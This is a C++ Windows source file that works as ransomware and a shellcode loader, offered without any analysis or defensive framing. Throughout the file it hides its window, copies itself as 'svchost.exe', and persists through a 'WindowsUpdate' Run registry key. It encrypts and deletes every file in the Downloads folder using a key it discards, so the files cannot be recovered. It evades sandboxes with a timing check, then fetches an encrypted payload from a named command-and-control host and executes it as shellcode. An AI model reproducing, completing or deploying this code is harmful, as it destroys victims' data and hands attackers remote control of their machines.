#include <windows.h>  
#include <processthreadsapi.h>  
#include <memoryapi.h>  
#include <string>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include <wincrypt.h>
#include <stdexcept>
#include <fstream>
#include <lmcons.h>
#include <winnetwk.h>
#include <tlhelp32.h>  // For process management functions
#include <psapi.h>     // For GetModuleFileNameExW
#include <shlobj.h>    // For SHGetFolderPathW and CSIDL_PROFILE
#include <cstdint>     // For uint64_t

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "psapi.lib")  // For GetModuleFileNameExW

// AES-128 CBC decryption using CryptoAPI
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

#define AES_KEY_LENGTH 128
#define BLOCK_SIZE 16

void WriteLog(const std::string& message) {
    try {
        std::ofstream logFile("C:\\Windows\\Temp\\system.log", std::ios::app);
        if (logFile.is_open()) {
            SYSTEMTIME st;
            GetLocalTime(&st);
            logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
                   << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond 
                   << "] " << message << std::endl;
            logFile.close();
        }
    } catch (...) {
        // Silently fail if logging fails
    }
}
// Helper function to convert std::string to std::wstring
std::wstring stringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}


// Function to recursively list all files in a directory and its subdirectories
std::vector<std::string> listFilesRecursive(const std::string& directory) {
    std::vector<std::string> files;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW((stringToWString(directory) + L"\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring fileName = findFileData.cFileName;
            std::string fullPath = directory + "\\" + std::string(fileName.begin(), fileName.end());

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (fileName != L"." && fileName != L"..") {
                    std::vector<std::string> subFiles = listFilesRecursive(fullPath);
                    files.insert(files.end(), subFiles.begin(), subFiles.end());
                }
            } else {
                files.push_back(fullPath);
            }
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }

    return files;
}

// Function to get process name from process ID
std::wstring GetProcessName(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess == NULL) return L"";

    wchar_t processName[MAX_PATH] = L"<unknown>";
    if (GetModuleFileNameExW(hProcess, NULL, processName, MAX_PATH)) {
        CloseHandle(hProcess);
        return std::wstring(processName);
    }
    CloseHandle(hProcess);
    return L"";
}

// Function to encrypt data using AES-128 CBC in Windows CryptoAPI
bool encryptFileAES(const std::string& filename) {
    WriteLog("Attempting to encrypt file: " + filename);
    
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    BYTE keyMaterial[32];
    if (!CryptGenRandom(hProv, sizeof(keyMaterial), keyMaterial)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, keyMaterial, sizeof(keyMaterial), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    BYTE iv[BLOCK_SIZE];
    if (!CryptGenRandom(hProv, BLOCK_SIZE, iv)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    HANDLE hInputFile = CreateFileA(filename.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    std::string encryptedFile = filename + ".notwncry";
    HANDLE hOutputFile = CreateFileA(encryptedFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hInputFile);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD bytesWritten;
    WriteFile(hOutputFile, iv, BLOCK_SIZE, &bytesWritten, NULL);

    const size_t BUFFER_SIZE = 4096;
    std::vector<BYTE> buffer(BUFFER_SIZE);
    bool isLastBlock = false;

    while (!isLastBlock) {
        DWORD bytesRead;
        if (!ReadFile(hInputFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (bytesRead < BUFFER_SIZE) {
            isLastBlock = true;
            size_t padding = BLOCK_SIZE - (bytesRead % BLOCK_SIZE);
            for (size_t i = bytesRead; i < bytesRead + padding; i++) {
                buffer[i] = static_cast<BYTE>(padding);
            }
            bytesRead += padding;
        }

        DWORD dataSize = bytesRead;
        if (!CryptEncrypt(hKey, 0, isLastBlock, 0, buffer.data(), &dataSize, buffer.size())) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (!WriteFile(hOutputFile, buffer.data(), dataSize, &bytesWritten, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }
    }

    CloseHandle(hInputFile);
    CloseHandle(hOutputFile);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    if (DeleteFileA(filename.c_str())) {
        WriteLog("Successfully encrypted and deleted: " + filename);
    } else {
        WriteLog("Failed to delete original file: " + filename);
    }
    return true;
}

void BypassDynamicAnalysis()
{
    int tick = GetTickCount64();
    Sleep(5000);
    int tock = GetTickCount64();
    if ((tock - tick) < 4500)
        exit(0);
}

std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR filename) {
    WriteLog("Attempting to connect to C2: " + std::string(baseAddress, baseAddress + wcslen(baseAddress)));
    
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",  // Add User-Agent
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        WriteLog("Failed to create WinHTTP session");
        return std::vector<BYTE>();
    }

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);

    if (!hConnect) {
        WriteLog("Failed to connect to C2 server");
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    WriteLog("Successfully connected to C2 server");

    // Add proper headers
    LPCWSTR additionalHeaders = L"Accept: */*\r\n"
                               L"Accept-Language: en-US,en;q=0.9\r\n"
                               L"Connection: keep-alive\r\n"
                               L"Cache-Control: no-cache\r\n";

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        WriteLog("Failed to create HTTP request");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    if (!WinHttpSendRequest(
        hRequest,
        additionalHeaders,
        -1L,  // Length of additional headers
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0)) {
        WriteLog("Failed to send HTTP request");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WriteLog("Failed to receive HTTP response");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    // Get and log HTTP status code
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &statusCodeSize,
        NULL)) {
        WriteLog("HTTP Status Code: " + std::to_string(statusCode));
    }

    // Get and log Content-Length
    DWORD contentLength = 0;
    DWORD contentLengthSize = sizeof(contentLength);
    if (WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &contentLength,
        &contentLengthSize,
        NULL)) {
        WriteLog("Content-Length: " + std::to_string(contentLength));
    }

    WriteLog("Successfully received HTTP response");

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;

    do {
        BYTE temp[4096]{};
        if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead)) {
            WriteLog("Failed to read HTTP data");
            break;
        }

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
            totalBytesRead += bytesRead;
            WriteLog("Read " + std::to_string(bytesRead) + " bytes, total: " + std::to_string(totalBytesRead));
        }

    } while (bytesRead > 0);

    WriteLog("Downloaded " + std::to_string(buffer.size()) + " bytes from C2");

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
    return wString;
}


bool IsRegistryEntryExists() {
    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    DWORD dataSize = sizeof(szPath);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        LONG result = RegQueryValueExW(hKey, L"WindowsUpdate", NULL, NULL, (LPBYTE)szPath, &dataSize);
        RegCloseKey(hKey);
        return (result == ERROR_SUCCESS);
    }
    return false;
}

bool AddToRegistryStartup() {
    // Check if registry entry already exists
    if (IsRegistryEntryExists()) {
        return true; // Entry already exists, no need to create again
    }

    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Function to decrypt AES-128 CBC encrypted data
std::vector<BYTE> DecryptAES(const std::vector<BYTE>& encryptedData, const BYTE* keyMaterial, size_t keyLength) {
    WriteLog("Starting AES decryption process");
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    std::vector<BYTE> decryptedData;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        WriteLog("Failed to acquire crypto context");
        return decryptedData;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        WriteLog("Failed to create hash");
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptHashData(hHash, keyMaterial, keyLength, 0)) {
        WriteLog("Failed to hash key material");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        WriteLog("Failed to derive key");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        WriteLog("Failed to set CBC mode");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (encryptedData.size() < BLOCK_SIZE) {
        WriteLog("Encrypted data too small for IV");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)encryptedData.data(), 0)) {
        WriteLog("Failed to set IV");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    std::vector<BYTE> dataToDecrypt(encryptedData.begin() + BLOCK_SIZE, encryptedData.end());
    DWORD dataSize = dataToDecrypt.size();
    WriteLog("Attempting to decrypt " + std::to_string(dataSize) + " bytes");

    if (!CryptDecrypt(hKey, 0, TRUE, 0, dataToDecrypt.data(), &dataSize)) {
        WriteLog("Failed to decrypt data");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    BYTE padding = dataToDecrypt[dataSize - 1];
    if (padding > 0 && padding <= BLOCK_SIZE) {
        dataSize -= padding;
        WriteLog("Removed " + std::to_string(padding) + " bytes of padding");
    }

    decryptedData.assign(dataToDecrypt.begin(), dataToDecrypt.begin() + dataSize);
    WriteLog("Successfully decrypted " + std::to_string(dataSize) + " bytes");

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return decryptedData;
}

// Convert hex string to BYTE array
std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

bool CopyAndSetRegistry() {
    WriteLog("Starting copy and registry setup");
    
    // Get current executable path
    wchar_t currentPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, currentPath, MAX_PATH)) {
        WriteLog("Failed to get current executable path");
        return false;
    }
    
    // Get desktop path
    wchar_t desktopPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
        WriteLog("Failed to get desktop path");
        return false;
    }
    
    // Set target file path
    wchar_t targetPath[MAX_PATH];
    wcscpy_s(targetPath, desktopPath);
    wcscat_s(targetPath, L"\\svchost.exe");
    
    // Copy the file
    if (!CopyFileW(currentPath, targetPath, FALSE)) {
        WriteLog("Failed to copy executable");
        return false;
    }
    
    WriteLog("Successfully copied executable to: " + std::string(targetPath, targetPath + wcslen(targetPath)));
    
    // Create registry key pointing to the new location
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)targetPath, (wcslen(targetPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            WriteLog("Successfully created registry key");
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    
    WriteLog("Failed to create registry key");
    return false;
}

void RunPayload()
{
    try {
        WriteLog("Starting payload execution");
        
        // Copy executable and set up registry
        if (!CopyAndSetRegistry()) {
            WriteLog("Failed to copy executable and set up registry");
            return;
        }
        
        try {
            wchar_t userProfile[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
                std::wstring downloadsPath = std::wstring(userProfile) + L"\\Downloads";
                std::string targetDir = std::string(downloadsPath.begin(), downloadsPath.end());
                WriteLog("Scanning directory: " + targetDir);
                
                std::vector<std::string> files = listFilesRecursive(targetDir);
                WriteLog("Found " + std::to_string(files.size()) + " files to encrypt");
                
                for (const auto& file : files) {
                    try {
                        encryptFileAES(file);
                    } catch (...) {
                        WriteLog("Failed to encrypt file: " + file);
                        continue;
                    }
                }
            }
        } catch (...) {
            WriteLog("Error during file encryption process");
        }

        WriteLog("Starting C2 communication");
        BypassDynamicAnalysis();
        std::vector<BYTE> recvbuf;
        recvbuf = Download(13337, L"crypto.harrylee.id.vn\0", 443, L"/enc_nt205.bin\0");

        if (recvbuf.empty()) {
            WriteLog("Failed to download payload from C2");
            return;
        }

        WriteLog("Successfully downloaded payload from C2");

        // Convert hex key to BYTE array
        std::string hexKey = "df6b7d1be3467b0805b831bfed90b69a649381393efbb9cb295d1d307f78e650";
        WriteLog("Using decryption key: " + hexKey);
        std::vector<BYTE> keyMaterial = HexToBytes(hexKey);
        
        if (keyMaterial.size() != 32) {
            WriteLog("Invalid key material size: " + std::to_string(keyMaterial.size()));
            return;
        }

        // Decrypt the data
        WriteLog("Starting payload decryption");
        std::vector<BYTE> decryptedData = DecryptAES(recvbuf, keyMaterial.data(), keyMaterial.size());

        if (decryptedData.empty()) {
            WriteLog("Decryption failed - empty result");
            return;
        }

        WriteLog("Successfully decrypted payload, size: " + std::to_string(decryptedData.size()));

        LPVOID alloc_mem = VirtualAlloc(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!alloc_mem) {
            WriteLog("Failed to allocate memory for shellcode");
            return;
        }

        WriteLog("Allocated memory for shellcode at: 0x" + std::to_string(reinterpret_cast<uint64_t>(alloc_mem)));
        CopyMemory(alloc_mem, decryptedData.data(), decryptedData.size());

        // Set memory protection
        DWORD oldProtect;
        if (!VirtualProtect(alloc_mem, decryptedData.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            WriteLog("Failed to set memory protection");
            return;
        }

        WriteLog("Memory protection set successfully");

        // Create thread with higher priority and detached state
        WriteLog("Creating shellcode thread...");
        HANDLE tHandle = CreateThread(
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)alloc_mem,
            NULL,
            CREATE_SUSPENDED,  // Create suspended first
            NULL
        );

        if (tHandle) {
            WriteLog("Thread created successfully, setting up execution...");
            
            // Set thread priority to highest
            if (SetThreadPriority(tHandle, THREAD_PRIORITY_HIGHEST)) {
                WriteLog("Thread priority set to highest");
            } else {
                WriteLog("Failed to set thread priority");
            }

            // Set thread context to ensure proper execution
            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(tHandle, &ctx)) {
                WriteLog("Thread context retrieved successfully");
            } else {
                WriteLog("Failed to get thread context");
            }

            // Resume the thread
            if (ResumeThread(tHandle) != -1) {
                WriteLog("Thread resumed successfully");
            } else {
                WriteLog("Failed to resume thread");
            }

            // Keep the handle open for a short time to ensure thread starts
            Sleep(1000);
            
            // Now detach the thread
            CloseHandle(tHandle);
            WriteLog("Thread handle closed, shellcode should be running");
        } else {
            WriteLog("Failed to create shellcode thread. Error: " + std::to_string(GetLastError()));
        }

        // Keep main thread alive a bit longer to ensure shellcode initializes
        WriteLog("Waiting for shellcode initialization...");
        Sleep(2000);
        WriteLog("Main thread continuing...");

    } catch (...) {
        WriteLog("Critical error in RunPayload");
    }
}

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    try {
        RunPayload();
        
        // Keep the main thread alive to maintain the process
        WriteLog("Entering main loop to keep process alive");
        while (true) {
            Sleep(1000);  // Sleep for 1 second
        }
    } catch (...) {
        WriteLog("Critical error in main");
        return 1;
    }
    return 0;
}
